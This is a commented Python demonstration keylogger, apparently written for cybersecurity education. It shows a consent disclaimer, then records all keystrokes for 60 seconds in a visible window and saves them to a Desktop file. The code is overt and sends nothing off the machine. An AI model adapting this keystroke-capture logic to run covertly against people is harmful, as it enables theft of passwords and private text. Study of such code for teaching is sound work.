# Adriel Sanchez

# Imports the GUI library used to build the windows you see on screen
import tkinter as tk
# Imports the tool that listens for keyboard input
from pynput import keyboard
# Allows parts of the program to run at the same time (e.g. timer + GUI)
import threading
# Used to add delays (the 1-second countdown ticks)
import time
# Used to close the program if the user clicks Decline
import sys
# Used to stamp each keystroke with the current time
from datetime import datetime
# Used to find the user's Desktop folder regardless of what computer it runs on
from pathlib import Path

# ── GLOBAL VARIABLES ──────────────────────────────────────────────────────── #

# Holds every recorded keystroke as a list of strings
log = []
# How long the keylogger runs in seconds
duration = 60
# Reference to the live text box in the monitor window (starts empty)
log_box = None
# Reference to the countdown label in the monitor window (starts empty)
timer_label = None
# Reference to the monitor window itself (starts empty)
log_window = None

# ── KEY LOGGER ────────────────────────────────────────────────────────────── #

# This function runs every time a key is pressed
def on_press(key):
    # Grabs the current time in HH:MM:SS format
    timestamp = datetime.now().strftime("%H:%M:%S")
    try:
        # For regular keys (letters, numbers, symbols) — records the actual character
        entry = f"[{timestamp}] {key.char}"
    except AttributeError:
        # For special keys (Shift, Enter, Backspace, etc.) — records the key name in brackets
        entry = f"[{timestamp}] [{key.name}]"
    # Adds the entry to the in-memory list
    log.append(entry)
    # Also pushes the entry to the live monitor window
    update_log_window(entry)

# Saves everything in the log list to a text file on the Desktop
def write_log():
    try:
        # Builds the path to the user's Desktop
        desktop = Path.home() / "Desktop"
        # Sets the output filename
        filename = desktop / "KeyLogger-AS-Output.txt"
        # Opens (or creates) the file and writes every log entry, one per line
        with open(filename, "w") as f:
            f.write("\n".join(log))
        # Prints a success message to the console
        print(f"✅ Log saved to: {filename}")
    except Exception as e:
        # If something goes wrong, prints the error instead of crashing silently
        print("❌ Failed to write log:", e)

# ── GUI FUNCTIONS ─────────────────────────────────────────────────────────── #

# Adds a new keystroke entry to the live text box in the monitor window
def update_log_window(entry):
    if log_box:
        # Temporarily unlocks the text box so text can be inserted
        log_box.config(state="normal")
        # Appends the new entry on a new line
        log_box.insert("end", entry + "\n")
        # Scrolls the text box to the bottom so the latest entry is always visible
        log_box.see("end")
        # Locks the text box again so the user can't type in it
        log_box.config(state="disabled")

# Builds and displays the live monitor window that shows keystrokes in real time
def show_log_window():

    # Runs the countdown timer in the background without freezing the window
    def countdown():
        remaining = duration
        # Ticks down one second at a time until time runs out
        while remaining > 0:
            time.sleep(1)
            remaining -= 1
            try:
                # Updates the countdown label on screen each second
                timer_label.config(text=f"Recording... {remaining}s left")
            except:
                # If the window was closed early, stop the loop gracefully
                break
        try:
            # Closes the monitor window when the timer hits zero
            log_window.destroy()
        except:
            pass

    # Makes the inner variables accessible to the rest of the program
    global log_box, timer_label, log_window

    # Creates the monitor window
    log_window = tk.Tk()
    # Sets the window title
    log_window.title("Live Keylogger Monitor")
    # Sets the window size in pixels
    log_window.geometry("600x400")
    # Sets the background color to a dark gray
    log_window.configure(bg="#121212")

    # Creates the countdown label at the top of the window
    timer_label = tk.Label(log_window, text="", fg="lime", bg="#121212", font=("Courier", 12, "bold"))
    # Adds the label to the window with a small top/bottom margin
    timer_label.pack(pady=5)

    # Creates the scrollable text box where keystrokes appear live
    log_box = tk.Text(log_window, width=70, height=20, bg="black", fg="lime", font=("Courier", 10))
    # Adds the text box to the window with padding around it
    log_box.pack(padx=10, pady=10)
    # Locks the text box so only the program can write to it
    log_box.config(state="disabled")

    # Starts the countdown on a background thread so the GUI stays responsive
    threading.Thread(target=countdown, daemon=True).start()
    # Launches the monitor window and keeps it open until it's closed
    log_window.mainloop()

    # Once the window closes (timer done or manually closed), save the log to disk
    write_log()

# ── DISCLAIMER ────────────────────────────────────────────────────────────── #

# Builds and shows the disclaimer window that appears when the program first launches
def show_disclaimer():

    # Runs when the user checks the box and clicks Accept
    def on_accept():
        # Closes the disclaimer window
        disclaimer.destroy()
        # Starts listening for keystrokes on a background thread
        threading.Thread(target=keyboard.Listener(on_press=on_press).run, daemon=True).start()
        # Opens the live monitor window
        show_log_window()

    # Runs when the user clicks Decline — closes the program entirely
    def on_decline():
        disclaimer.destroy()
        sys.exit()

    # Enables or disables the Accept button based on whether the checkbox is checked
    def toggle_accept():
        accept_btn.config(state="normal" if agree_var.get() else "disabled")

    # Creates the disclaimer window
    disclaimer = tk.Tk()
    # Sets the window title
    disclaimer.title("Disclaimer")
    # Sets the window size
    disclaimer.geometry("550x440")
    # Sets the background to a dark theme
    disclaimer.configure(bg="#1e1e1e")

    # Creates the bold warning title at the top of the disclaimer
    title = tk.Label(disclaimer, text="⚠ EDUCATIONAL USE ONLY ⚠", font=("Arial", 14, "bold"),
                     bg="#1e1e1e", fg="#ff5555")
    # Adds it to the window with top/bottom padding
    title.pack(pady=10)

    # The full disclaimer message shown to the user
    msg = (
        "This is a demonstration keylogger tool created for cybersecurity education only.\n\n"
        "By clicking 'Accept', you acknowledge:\n\n"
        "• All keystrokes will be recorded for 60 seconds\n"
        "• The output will be saved to your Desktop as 'KeyLogger-AS-Output.txt'\n\n"
        "⚠ Do NOT use this on devices you do not own or without explicit permission.\n"
        "⚠ This program is legal ONLY when used ethically and responsibly."
    )

    # Displays the disclaimer message as a text label
    label = tk.Label(disclaimer, text=msg, wraplength=500, justify="left",
                     bg="#1e1e1e", fg="#ffffff", font=("Arial", 10))
    # Adds it to the window with padding
    label.pack(pady=10)

    # Variable that tracks whether the checkbox is checked (0 = unchecked, 1 = checked)
    agree_var = tk.IntVar()
    # Creates the "I understand" checkbox and links it to toggle_accept
    check = tk.Checkbutton(disclaimer, text="I understand and accept the terms", variable=agree_var,
                           command=toggle_accept, bg="#1e1e1e", fg="white", selectcolor="#1e1e1e")
    # Adds the checkbox to the window
    check.pack(pady=5)

    # Creates a container frame to hold the Accept and Decline buttons side by side
    btn_frame = tk.Frame(disclaimer, bg="#1e1e1e")
    # Adds the frame to the window
    btn_frame.pack(pady=20)

    # Creates the Accept button (disabled by default until the checkbox is checked)
    accept_btn = tk.Button(btn_frame, text="Accept", command=on_accept, state="disabled",
                           bg="#4caf50", fg="white", width=12, font=("Arial", 10, "bold"))
    # Places the Accept button on the left side of the frame
    accept_btn.pack(side="left", padx=10)

    # Creates the Decline button (always enabled)
    decline_btn = tk.Button(btn_frame, text="Decline", command=on_decline,
                            bg="#f44336", fg="white", width=12, font=("Arial", 10, "bold"))
    # Places the Decline button on the right side of the frame
    decline_btn.pack(side="right", padx=10)

    # Creates the small credit label at the bottom of the disclaimer window
    credit = tk.Label(disclaimer, text="Created by Adriel Sanchez.",
                      bg="#1e1e1e", fg="#888888", font=("Arial", 9, "italic"))
    # Pins it to the bottom of the window
    credit.pack(side="bottom", pady=10)

    # Launches the disclaimer window and keeps it open until the user accepts or declines
    disclaimer.mainloop()

# ── START PROGRAM ─────────────────────────────────────────────────────────── #

# Entry point — this is the first thing that runs when the script is launched
show_disclaimer()
